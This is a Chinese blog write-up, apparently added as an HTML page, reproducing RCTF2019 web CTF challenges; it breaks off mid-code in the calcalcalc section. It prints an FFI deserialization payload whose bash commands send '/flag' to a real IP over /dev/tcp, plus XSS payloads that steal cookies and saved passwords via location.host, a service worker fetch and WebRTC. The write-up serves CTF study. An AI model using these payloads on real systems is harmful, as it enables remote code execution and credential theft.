@@ -1,0 +1,866 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next mist use-motion" lang="zh-Hans">
+<head><meta name="generator" content="Hexo 3.8.0">
+  <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform">
+<meta http-equiv="Cache-Control" content="no-siteapp">
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css">
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css">
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css">
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="ctf,web,">
+
+
+
+
+
+
+
+
+
+
+<meta name="description" content="复现这个环境真的要命，真的是整几天docker做一天题Orz">
+<meta name="keywords" content="ctf,web">
+<meta property="og:type" content="article">
+<meta property="og:title" content="RCTF2019 web 复现">
+<meta property="og:url" content="http://yoursite.com/2019/07/20/RCTF2019-web-wp/index.html">
+<meta property="og:site_name" content="k0t0r1の家">
+<meta property="og:description" content="复现这个环境真的要命，真的是整几天docker做一天题Orz">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:image" content="http://shifeng-kaze.cn/blog/RCTF2019_web_wp/3c24a73a416975aef3223f3ed75a6948.png">
+<meta property="og:image" content="http://shifeng-kaze.cn/blog/RCTF2019_web_wp/f1abee1cbb6881710dafe1de7e4a2714.png">
+<meta property="og:image" content="http://shifeng-kaze.cn/blog/RCTF2019_web_wp/5d2fa85def950ff15e0099624e63538c.png">
+<meta property="og:image" content="http://shifeng-kaze.cn/blog/RCTF2019_web_wp/804e4b8b15bf0bc108d071d1b8a48297.png">
+<meta property="og:image" content="http://shifeng-kaze.cn/blog/RCTF2019_web_wp/693eba1af7411d85ee572541680a6443.jpg">
+<meta property="og:image" content="http://shifeng-kaze.cn/blog/RCTF2019_web_wp/7e6b6c53be81dd685cbc541c61bc728d.png">
+<meta property="og:image" content="http://shifeng-kaze.cn/blog/RCTF2019_web_wp/fc12c4d5ce09aa94cac0810e8791b882.png">
+<meta property="og:image" content="http://shifeng-kaze.cn/blog/RCTF2019_web_wp/f63f7f702d11ef2b49decaa46e001ff4.png">
+<meta property="og:updated_time" content="2020-03-18T14:22:21.992Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="RCTF2019 web 复现">
+<meta name="twitter:description" content="复现这个环境真的要命，真的是整几天docker做一天题Orz">
+<meta name="twitter:image" content="http://shifeng-kaze.cn/blog/RCTF2019_web_wp/3c24a73a416975aef3223f3ed75a6948.png">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Mist',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://yoursite.com/2019/07/20/RCTF2019-web-wp/">
+
+
+
+
+
+  <title>RCTF2019 web 复现 | k0t0r1の家</title>
+  
+
+
+
+
+
+
+
+
+</head>
+
+<body itemscope="" itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope="" itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">k0t0r1の家</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle"></p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br>
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br>
+            
+            归档
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/07/20/RCTF2019-web-wp/">
+
+    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="k0t0r1">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="http://shifeng-kaze.cn/blog/head/kotori.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="k0t0r1の家">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">RCTF2019 web 复现</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-07-20T00:46:53+09:00">
+                2019-07-20
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <p>复现这个环境真的要命，真的是整几天docker做一天题Orz</p>
+<a id="more"></a>
+<h2 id="nextphp"><a href="#nextphp" class="headerlink" title="nextphp"></a>nextphp</h2><p>进入直接没过滤可以执行命令</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">if (isset($_GET[&apos;a&apos;])) &#123;</span><br><span class="line">    eval($_GET[&apos;a&apos;]);</span><br><span class="line">&#125; else &#123;</span><br><span class="line">    show_source(__FILE__);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>于是尝试<code>?a=print_r(scandir(dirname(__FILE__)));</code></p>
+<p><img src="http://shifeng-kaze.cn/blog/RCTF2019_web_wp/3c24a73a416975aef3223f3ed75a6948.png" alt=""></p>
+<p>成功获得当前目录</p>
+<p>于是尝试用system()执行命令无返回，于是<code>echo phpinfo();</code>获得phpinfo()</p>
+<p><img src="http://shifeng-kaze.cn/blog/RCTF2019_web_wp/f1abee1cbb6881710dafe1de7e4a2714.png" alt=""></p>
+<p>查看发现反射类和执行命令用的方法被禁用于是另寻他路</p>
+<p>尝试<code>?a=show_source(&#39;preload.php&#39;);</code>获得preload.php源码</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">final class A implements Serializable &#123;</span><br><span class="line">    protected $data = [</span><br><span class="line">        &apos;ret&apos; =&gt; null,</span><br><span class="line">        &apos;func&apos; =&gt; &apos;print_r&apos;,</span><br><span class="line">        &apos;arg&apos; =&gt; &apos;1&apos;</span><br><span class="line">    ];</span><br><span class="line"></span><br><span class="line">    private function run () &#123;</span><br><span class="line">        $this-&gt;data[&apos;ret&apos;] = $this-&gt;data[&apos;func&apos;]($this-&gt;data[&apos;arg&apos;]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function __serialize(): array &#123;</span><br><span class="line">        return $this-&gt;data;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function __unserialize(array $data) &#123;</span><br><span class="line">        array_merge($this-&gt;data, $data);</span><br><span class="line">        $this-&gt;run();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function serialize (): string &#123;</span><br><span class="line">        return serialize($this-&gt;data);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function unserialize($payload) &#123;</span><br><span class="line">        $this-&gt;data = unserialize($payload);</span><br><span class="line">        $this-&gt;run();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function __get ($key) &#123;</span><br><span class="line">        return $this-&gt;data[$key];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function __set ($key, $value) &#123;</span><br><span class="line">        throw new \Exception(&apos;No implemented&apos;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function __construct () &#123;</span><br><span class="line">        throw new \Exception(&apos;No implemented&apos;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>首先通过phpinfo可以知道环境是php7.4<br>在php7.4中新定义了两个用于序列化的魔术方法__serialize()和_unserialize()，用于自定义序列化的方式，详细用途见<a href="https://wiki.php.net/rfc/custom_object_serialization" target="_blank" rel="noopener">PHP RFC: New custom object serialization mechanism</a><br>除此之外在php7.x（不清楚）还新增了一个Serializable接口，这个接口中定义了serialize()和unserialize()这两个方法，也是用于重新定义序列化方式的（详见同上），但在与php7.4新增的这两个魔术方法同时存在时，会优先使用魔术方法</p>
+<p>于是读一下代码我们就知道要通过反序列化调用run方法，然后执行命令，但问题在于执行命令的方法都被禁用了就很头大。</p>
+<p>不过找一找php7.4的新特性就会发现，php7.4新增了一个<a href="https://wiki.php.net/rfc/ffi" target="_blank" rel="noopener">外部函数接口(Foreign Function Interface)</a>,这个接口允许开发者在php中写C<br>这里是一个使用例子:<a href="https://www.oschina.net/p/php-ffi" target="_blank" rel="noopener">PHP 外部函数接口 PHP-FFI </a><br>在这个接口中，我们可以通过<code>FFI::cdef()</code>这个静态方法去创建一个FFI类，然后调用执行里面的C函数。而且FFI很牛逼地可以绕过php.ini中open_basedir和disable_functions的限制。这么强的一个接口官方自然会削一下，在默认设置下只允许在预加载的php文件中调用这个接口。不过正好另一个文件名preload翻译过来就是预加载，而且php7.4中的新特性也有预加载，解题的方向应该就是这个了。</p>
+<p>接着查查看预加载<br><a href="https://www.jb51.net/article/164850.htm" target="_blank" rel="noopener">PHP 7.4中使用预加载的方法详解</a><br>大概就是通过设置可以将一部分较少需要修改的php文件编译为字节码后，缓存在opcache内存中以加快php的执行速度。被设置为预加载的文件可以通过phpinfo查看</p>
+<p><img src="http://shifeng-kaze.cn/blog/RCTF2019_web_wp/5d2fa85def950ff15e0099624e63538c.png" alt=""></p>
+<p>查一下确实就是preload.php，于是先构造一下反序列化字符串</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class A  implements Serializable&#123;</span><br><span class="line">    protected $data = [</span><br><span class="line">        &apos;ret&apos; =&gt; null,</span><br><span class="line">        &apos;func&apos; =&gt; &apos;FFI::cdef&apos;,</span><br><span class="line">        &apos;arg&apos; =&gt; &apos;int system(const char *command);&apos;</span><br><span class="line">    ];</span><br><span class="line"></span><br><span class="line">    public function serialize (): string &#123;</span><br><span class="line">        return serialize($this-&gt;data);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function unserialize($payload) &#123;</span><br><span class="line">        $this-&gt;data = unserialize($payload);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$a = new A();</span><br><span class="line">echo serialize($a);</span><br></pre></td></tr></table></figure>
+<p>得到</p>
+<p><code>C:1:&quot;A&quot;:95:{a:3:{s:3:&quot;ret&quot;;N;s:4:&quot;func&quot;;s:8:&quot;FFI:cdef&quot;;s:3:&quot;arg&quot;;s:31:&quot;int system(const char *command);&quot;;}}</code></p>
+<p>这里要用题目给的serialize()去序列化，因为是数据部分反序列化后直接赋给成员data。如果有变量名的话会变成二维数组，那就要<code>data[&#39;data&#39;]</code>才能用我们构造的数组去正确覆盖掉成员data</p>
+<p>然后直接通过a参数去执行反序列化，调用get方法获得ret变量最后再执行system()</p>
+<p>于是payload:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">unserialize(&apos;C:1:&quot;A&quot;:95:&#123;a:3:&#123;s:3:&quot;ret&quot;;N;s:4:&quot;func&quot;;s:9:&quot;FFI::cdef&quot;;s:3:&quot;arg&quot;;s:32:&quot;int system(const char *command);&quot;;&#125;&#125;&apos;)-&gt;__get(&apos;ret&apos;)-&gt;system(&apos;bash -c &quot;cd ../../../../../../../;ls -l &gt; /dev/tcp/ip/port&quot;&apos;);</span><br><span class="line"></span><br><span class="line">unserialize(&apos;C:1:&quot;A&quot;:95:&#123;a:3:&#123;s:3:&quot;ret&quot;;N;s:4:&quot;func&quot;;s:9:&quot;FFI::cdef&quot;;s:3:&quot;arg&quot;;s:32:&quot;int system(const char *command);&quot;;&#125;&#125;&apos;)-&gt;__get(&apos;ret&apos;)-&gt;system(&apos;bash -c &quot;cat /flag &gt; /dev/tcp/119.23.206.8/2333&quot;&apos;);</span><br></pre></td></tr></table></figure></p>
+<p>获得目录与flag</p>
+<p><img src="http://shifeng-kaze.cn/blog/RCTF2019_web_wp/804e4b8b15bf0bc108d071d1b8a48297.png" alt=""></p>
+<p><img src="http://shifeng-kaze.cn/blog/RCTF2019_web_wp/693eba1af7411d85ee572541680a6443.jpg" alt=""></p>
+<h2 id="jail"><a href="#jail" class="headerlink" title="jail"></a>jail</h2><p>这是一道很有趣的XSS的题，有好几种解法。可惜复现时bot好像启用失败，只能写写大致的思路了</p>
+<p>首先登录进入，整一下就会发现有两个可用的接口。<code>?action=profile</code>用于上传文件，不过php和html都被限制了。另一个接口<code>?action=post</code>一看就是搞XSS的</p>
+<p>试着写个<code>&lt;img src=&quot;https://www.baidu.com&quot;&gt;</code>，发现并没有加载，开一下控制台看看发现</p>
+<p><img src="http://shifeng-kaze.cn/blog/RCTF2019_web_wp/7e6b6c53be81dd685cbc541c61bc728d.png" alt=""></p>
+<p>由于Content Security Policy的限制导致资源没被加载，Content Security Policy是个啥玩意？？？百度一下百度一下</p>
+<p><a href="https://www.jianshu.com/p/a8b769e7d4bd" target="_blank" rel="noopener">Content-Security-Policy的实战应用</a></p>
+<p>CSP这个东西大概就是类似于同源策略，不过同源策略限制的是不同源的话服务器端无法读客户端的数据，但无法避免客户端被利用去恶意加载不同源的服务器的资源。而CSP就是为此而生，通过CSP我们能够限制客户端可以允许读取的资源。</p>
+<p>关于详细的CSP配置可以看这<br><a href="https://cloud.tencent.com/developer/chapter/13541" target="_blank" rel="noopener">CSP</a></p>
+<p>于是从抓包看一下CSP的配置（同时也可以看到给了hint:flag在cookie）</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Content-Security-Policy: sandbox allow-scripts allow-same-origin; base-uri &apos;none&apos;;default-src &apos;self&apos;;script-src &apos;unsafe-inline&apos; &apos;self&apos;;connect-src &apos;none&apos;;object-src &apos;none&apos;;frame-src &apos;none&apos;;font-src data: &apos;self&apos;;style-src &apos;unsafe-inline&apos; &apos;self&apos;;</span><br></pre></td></tr></table></figure>
+<p>可以看到iframe被限制，<code>connect-src</code>限制了<code>&lt;a&gt;, ping, fetch, XMLHttpRequest, WebSocket, EventSource</code>。不过script并没被完全限制，允许内联，本来想着能靠这个来进行跳转。但post接口中通过一段js，使用了freeze()冻结<code>document.location</code>限制住了跳转</p>
+<p>到这里，就有两个解题方向，一个是绕过CSP，另一个是绕过freeze()</p>
+<p>先说绕freeze()</p>
+<p>绕过freeze()好像属于非预期解，这里虽然freeze()冻结了<code>document.location</code>，但用<code>location.host</code>却可以被修改<br>找了下资料大概就是说freeze()会让对象不可拓展，同时将configurable和writable 属性设为false。<br>当configurable为false时，对象属性特性无法更改且无法删除属性；当writable 为false则不能更改属性值。<br>而由于href的writable 值被设为了false因此自然就不能修改，但host和hostname并没有writable特性，这两个属性的赋值与取值是通过setter和getter完成的，这就是能够修改host的原因</p>
+<p>有一个能跳转的就好办，上一波payload</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">function stringToHex(str)&#123;</span><br><span class="line">	var val=&quot;&quot;;</span><br><span class="line">	for(var i = 0; i &lt; str.length; i++)&#123;</span><br><span class="line">		if(val == &quot;&quot;)</span><br><span class="line">			val = str.charCodeAt(i).toString(16);</span><br><span class="line">		else</span><br><span class="line">			val += str.charCodeAt(i).toString(16);</span><br><span class="line">	&#125;</span><br><span class="line">	return val;</span><br><span class="line">&#125;</span><br><span class="line">location.host=stringToHex(document.cookie).substr(0,60)+&quot;.域名:80&quot;</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+<p>这里由于是修改host，所以不能通过get传参过去，只能通过不同级的域名发送过去。如果是用自己服务器接的记得要配二级以上的域名，不然会接不到。同时由于这个搭环境时默认是搭在12315端口上，所以不能用hostname，必须用host指定80端口（这里坑了我好久，不过还是因为bot没反应还是没打出来）</p>
+<p>然后是绕过CSP。绕过CSP则有三种方法，一种是使用Service Worker，另一种是用WebRTC,还有一种是DNS-prefetch</p>
+<p>首先什么是Service Worker，Service Worker可以看作是一个远程缓存的接口，起离线依旧保持用户的缓存状态等作用。<br>而Service Worker有一个特点，在Service Worker执行js代码时，会遵从的是这个js的CSP。<br>不过在注册Service Worker时会受到<code>worker-src</code>与<code>script-src</code>，在存在<code>worker-src</code>时，若设为<code>self</code>则可以注册，而不存在时则看<code>script-src</code>。<br>还有作为Service Worker的服务器必须通过https进行数据交互</p>
+<p>看post页面的CSP配置可以看到script-src是有self配置的，于是可以使用Service Worker。</p>
+<p><code>script-src &#39;unsafe-inline&#39; &#39;self&#39;;</code></p>
+<p>于是先创建一个js</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fetch(&apos;https://ip或域名?&apos; + encodeURIComponent(globalThis.location.href), &#123;mode: &apos;no-cors&apos;&#125;)</span><br></pre></td></tr></table></figure>
+<p>然后通过头像上传，再获得存储的位置，然后创建消息。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;navigator.serviceWorker.register(&apos;/uploads/sw.js?&apos;+encodeURIComponent(document.cookie),&#123;scope: &apos;/uploads/&apos;&#125;);&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+<p>这里我在本地测试了很多次，注册Service Worker但就是引入js后无法fetch传出数据，以后再查看看为什么吧（主要js还是不够熟）</p>
+<p>然后WebRTC则是利用<code>connect-src</code>没有限制WebRTC这个API，而且官方知道但好像没准备补（巨坑x），不过好像要搭ice服务器才能接收数据于是先坑了【逃</p>
+<p>这是大佬们的payload</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">	var pc = new RTCPeerConnection(&#123;&quot;iceServers&quot;:[&#123;&quot;urls&quot;:[&quot;turn:YOUR_IP:YOUR_PORT?transport=udp&quot;],&quot;username&quot;:document.cookie,&quot;credential&quot;:&quot;.&quot;&#125;]&#125;);</span><br><span class="line">	pc.createOffer().then((sdp)=&gt;pc.setLocalDescription(sdp));</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+<p>DNS-prefetch嘛，说是用js动态创建link标签然后利用 DNS 预解析查询外带数据</p>
+<p><a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-DNS-Prefetch-Control" target="_blank" rel="noopener">X-DNS-Prefetch-Control
+</a></p>
+<p>emmm…有时间我再整整这个</p>
+<h2 id="password"><a href="#password" class="headerlink" title="password"></a>password</h2><p>这题和上一题是同样的环境，于是还是只能写写思路</p>
+<p>给了三个提示，第一个打密码，第二个是说不是chrome自带的密码管理，第三个是说获取html源码</p>
+<p>那猜测大概是某种chrome插件管理密码，然后由于输入密码时会下拉框加载先前输入过的密码。于是我们可以通过XSS构造一个登录框，把所有保存的该站的密码给拿到。这可真是个斯巴拉西的操作</p>
+<p>于是先按hint写一个登录框抓源码</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&lt;input type=&quot;username&quot; name=&quot;username&quot;&gt;</span><br><span class="line">&lt;input type=&quot;password&quot; name=&quot;password&quot;&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">function stringToHex(str)&#123;</span><br><span class="line">    var val=&quot;&quot;;</span><br><span class="line">    for(var i = 0; i &lt; str.length; i++)&#123;</span><br><span class="line">      	if(val == &quot;&quot;)</span><br><span class="line">        	val = str.charCodeAt(i).toString(16);</span><br><span class="line">      	else</span><br><span class="line">        	val += str.charCodeAt(i).toString(16);</span><br><span class="line">    &#125;</span><br><span class="line">    return val;</span><br><span class="line">&#125;</span><br><span class="line">setTimeout(function () &#123;</span><br><span class="line">    location.host=stringToHex(btoa(document.body.innerHTML)).substr(1800,60)+&quot;.域名:80&quot;;</span><br><span class="line">&#125;, 1000);</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+<p>这里要通过延时才能让候选密码显示</p>
+<p>拿到读一下</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;input type=&quot;username&quot; name=&quot;username&quot; data-cip-id=&quot;cIPJQ342845639&quot; class=&quot;cip-ui-autocomplete-input&quot; autocomplete=&quot;off&quot;&gt;</span><br><span class="line">&lt;span role=&quot;status&quot; aria-live=&quot;polite&quot; class=&quot;cip-ui-helper-hidden-accessible&quot;&gt;&lt;/span&gt;</span><br><span class="line">&lt;input type=&quot;password&quot; name=&quot;password&quot; data-cip-id=&quot;cIPJQ342845640&quot;&gt;</span><br></pre></td></tr></table></figure>
+<p>可以看到输入框处多了个<code>data-cip-id</code>，百度一下发现是ChromeIPass拓展会添加的元素。本地安装一下，在出现候选密码时看一下源码，发现候选密码用的都是<code>cip-ui-menu-item</code>这个class，于是我们可以专门去抓这个class处的数据</p>
+<p>payload</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">&lt;input type=&quot;username&quot; name=&quot;username&quot;&gt;</span><br><span class="line">&lt;input type=&quot;password&quot; name=&quot;password&quot;&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">function stringToHex(str)&#123;</span><br><span class="line">    var val=&quot;&quot;;</span><br><span class="line">    for(var i = 0; i &lt; str.length; i++)&#123;</span><br><span class="line">    	if(val == &quot;&quot;)</span><br><span class="line">			val = str.charCodeAt(i).toString(16);</span><br><span class="line">		else</span><br><span class="line">			val += str.charCodeAt(i).toString(16);</span><br><span class="line">    &#125;</span><br><span class="line">    return val;</span><br><span class="line">&#125;</span><br><span class="line">setTimeout(function () &#123;</span><br><span class="line">	document.getElementsByName(&apos;username&apos;)[0].click();</span><br><span class="line">	document.getElementsByClassName(&apos;cip-ui-menu-item&apos;)[1].click();</span><br><span class="line">	location.host=stringToHex(btoa(document.getElementsByName(&apos;password&apos;)[0].value)).substr(0,60)+&quot;.域名:80&quot;;</span><br><span class="line">&#125;, 3000);</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+<p>这题依旧可以用上题的Sevice Worker和WebRTC以及DNS-prefetch的方法去做</p>
+<h2 id="calcalcalc"><a href="#calcalcalc" class="headerlink" title="calcalcalc"></a>calcalcalc</h2><p>这题拿docker搭了后迷之用不了，不过好像原题就是给了源码，那就读着源码+wp来做好了</p>
+<p>这题进去是一个计算器，输入后计算结果。不过这里会将计算丢入三个不同的后端（php，python和nodejs)，进行计算后比对结果，结果相同再返回，不同则报错</p>
+<p>看源码可以看到主页面是用typescript写的，没用过orz，看了好久大概看出整一个流程应该是</p>
+<p><code>index.hbs→main.ts→app.module.ts→app.controller.ts→calculate.model.ts→expression.validator.ts</code></p>
+<p>但我实在找不到post过去的数据是怎么传给CalculateModel的</p>
+<p>读calculate.model.ts和expression.validator.ts可以看到</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">@ExpressionValidator(15, &#123;</span><br><span class="line">    message: &apos;Invalid input&apos;,</span><br><span class="line">  &#125;)</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">export function ExpressionValidator(property: number, validationOptions?: ValidationOptions) &#123;</span><br><span class="line">   return (object: Object, propertyName: string) =&gt; &#123;</span><br><span class="line">        registerDecorator(&#123;</span><br><span class="line">            name: &apos;ExpressionValidator&apos;,</span><br><span class="line">            target: object.constructor,</span><br><span class="line">            propertyName,</span><br><span class="line">            constraints: [property],</span><br><span class="line">            options: 